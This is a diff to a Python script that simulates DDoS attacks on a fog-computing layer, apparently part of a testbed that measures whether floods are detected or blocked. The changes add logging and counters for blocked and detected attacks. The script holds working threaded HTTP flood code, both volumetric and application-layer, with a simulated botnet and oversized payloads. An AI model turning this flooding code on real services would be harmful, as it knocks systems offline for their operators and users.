@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-CE-CMS DDoS Flood Attack Simulation
+CE-CMS DDoS Flood Attack Simulation - COMPLETE WITH LOGGING
 Simulates distributed denial of service attacks on fog layer
 """
 
@@ -13,6 +13,15 @@ import logging
 from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor
 
+# Configure logging to write to file
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('/app/results/logs/attacks.log'),
+        logging.StreamHandler()
+    ]
+)
 logger = logging.getLogger(__name__)
 
 class DDoSFlooder:
@@ -26,7 +35,9 @@ class DDoSFlooder:
             "packets_sent": 0,
             "requests_per_second": 0,
             "attack_duration": 0,
-            "source_ips_used": 0
+            "source_ips_used": 0,
+            "attacks_detected": 0,
+            "attacks_blocked": 0
         }
         
         # Botnet simulation
@@ -49,12 +60,12 @@ class DDoSFlooder:
             "packet_id": f"ddos_{packet_type}_{int(time.time() * 1000000)}",
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "source_ip": source_ip,
-            "destination_ip": "192.168.100.1",  # Fog layer IP
+            "destination_ip": "192.168.100.1",
             "packet_type": packet_type,
             "size": random.randint(64, 1500),
             "protocol": random.choice(["TCP", "UDP", "ICMP"]),
             "flags": ["SYN"] if packet_type == "tcp_syn_flood" else [],
-            "payload": "A" * random.randint(100, 1000),  # Junk data
+            "payload": "A" * random.randint(100, 1000),
             "malicious": True,
             "attack_type": "ddos_flood"
         }
@@ -69,18 +80,26 @@ class DDoSFlooder:
             try:
                 packet = self.generate_flood_packet(source_ip)
                 
-                # Send to fog layer
                 response = requests.post(
                     f"{self.fog_url}/device_data",
                     json=packet,
-                    timeout=1  # Short timeout to overwhelm
+                    timeout=1
                 )
                 
                 packets_sent += 1
                 self.attack_stats["packets_sent"] += 1
                 
+                # Check if detected/blocked
+                if response.status_code == 403 or response.status_code == 429:
+                    self.attack_stats["attacks_blocked"] += 1
+                    logger.debug(f"DDoS packet blocked by fog layer")
+                elif response.status_code == 200:
+                    result = response.json()
+                    if result.get("anomaly_detected"):
+                        self.attack_stats["attacks_detected"] += 1
+                        logger.debug(f"DDoS attack detected by fog layer")
+                
             except requests.exceptions.RequestException:
-                # Expected during successful DDoS
                 packets_sent += 1
                 self.attack_stats["packets_sent"] += 1
             except Exception as e:
@@ -95,7 +114,6 @@ class DDoSFlooder:
         
         self.attack_active = True
         
-        # Set intensity parameters
         intensity_params = {
             "low": {"threads": 10, "packets_per_wave": 5, "wave_delay": 0.5},
             "medium": {"threads": 25, "packets_per_wave": 10, "wave_delay": 0.2},
@@ -105,30 +123,26 @@ class DDoSFlooder:
         
         params = intensity_params.get(intensity, intensity_params["high"])
         
-        logger.warning(f"Launching volumetric DDoS attack - Intensity: {intensity}")
+        logger.warning(f"DDoS volumetric attack launched - Intensity: {intensity}")
         
         def attack_coordinator():
             start_time = time.time()
             
             with ThreadPoolExecutor(max_workers=params["threads"]) as executor:
                 while time.time() - start_time < duration and self.attack_active:
-                    # Select random IPs from botnet
                     selected_ips = random.sample(self.botnet_ips, min(params["threads"], len(self.botnet_ips)))
                     
-                    # Launch concurrent flood waves
                     futures = []
                     for ip in selected_ips:
                         future = executor.submit(self.send_flood_wave, ip, params["packets_per_wave"])
                         futures.append(future)
                     
-                    # Wait for wave completion
                     for future in futures:
                         try:
                             future.result(timeout=2)
                         except:
                             pass
                     
-                    # Calculate current RPS
                     elapsed = time.time() - start_time
                     if elapsed > 0:
                         self.attack_stats["requests_per_second"] = self.attack_stats["packets_sent"] / elapsed
@@ -139,7 +153,7 @@ class DDoSFlooder:
             self.attack_stats["source_ips_used"] = len(set(self.botnet_ips))
             self.attack_active = False
             
-            logger.info(f"Volumetric DDoS attack completed. Packets sent: {self.attack_stats['packets_sent']}")
+            logger.info(f"DDoS volumetric attack completed - Stats: {self.attack_stats}")
         
         threading.Thread(target=attack_coordinator, daemon=True).start()
         
@@ -156,12 +170,11 @@ class DDoSFlooder:
             return {"status": "attack_already_active"}
         
         self.attack_active = True
-        logger.warning("Launching application layer DDoS attack")
+        logger.warning("DDoS application layer attack launched")
         
         def app_layer_attack():
             start_time = time.time()
             
-            # Target specific endpoints
             endpoints = [
                 "/device_data",
                 "/network_status", 
@@ -171,28 +184,34 @@ class DDoSFlooder:
             
             while time.time() - start_time < duration and self.attack_active:
                 try:
-                    # Select random endpoint and IP
                     endpoint = random.choice(endpoints)
                     source_ip = random.choice(self.botnet_ips)
                     
-                    # Create application-specific attack
                     if endpoint == "/device_data":
-                        # Send massive fake device data
                         fake_data = self._create_massive_device_data(source_ip)
-                        requests.post(f"{self.fog_url}{endpoint}", json=fake_data, timeout=1)
+                        response = requests.post(f"{self.fog_url}{endpoint}", json=fake_data, timeout=1)
                     else:
-                        # HTTP GET flood
-                        requests.get(f"{self.fog_url}{endpoint}", timeout=1)
+                        response = requests.get(f"{self.fog_url}{endpoint}", timeout=1)
                     
                     self.attack_stats["packets_sent"] += 1
                     
+                    # Check if detected/blocked
+                    if response.status_code == 403 or response.status_code == 429:
+                        self.attack_stats["attacks_blocked"] += 1
+                        logger.debug(f"DDoS application attack blocked")
+                    elif response.status_code == 200:
+                        result = response.json()
+                        if result.get("anomaly_detected"):
+                            self.attack_stats["attacks_detected"] += 1
+                            logger.debug(f"DDoS application attack detected")
+                    
                 except:
-                    self.attack_stats["packets_sent"] += 1  # Count failed attempts too
+                    self.attack_stats["packets_sent"] += 1
                 
-                time.sleep(0.01)  # Very high frequency
+                time.sleep(0.01)
             
             self.attack_active = False
-            logger.info("Application layer DDoS attack completed")
+            logger.info(f"DDoS application layer attack completed - Stats: {self.attack_stats}")
         
         threading.Thread(target=app_layer_attack, daemon=True).start()
         
@@ -200,14 +219,13 @@ class DDoSFlooder:
     
     def _create_massive_device_data(self, source_ip):
         """Create oversized device data payload"""
-        # Create massive sensor array
         sensors = []
-        for i in range(100):  # 100 fake sensors
+        for i in range(100):
             sensors.append({
                 "sensor_type": f"fake_sensor_{i}",
                 "data": {
-                    "values": [random.random() for _ in range(1000)],  # Large data array
-                    "metadata": "X" * 10000  # Large metadata
+                    "values": [random.random() for _ in range(1000)],
+                    "metadata": "X" * 10000
                 }
             })
         
@@ -251,13 +269,11 @@ if __name__ == "__main__":
     
     print("Starting DDoS flood attack simulation...")
     
-    # Launch volumetric attack
     result = flooder.launch_volumetric_attack(duration=30, intensity="high")
     print(f"Volumetric attack launched: {result}")
     
     time.sleep(35)
     
-    # Launch application layer attack
     result2 = flooder.launch_application_layer_attack(duration=20)
     print(f"Application layer attack launched: {result2}")
     
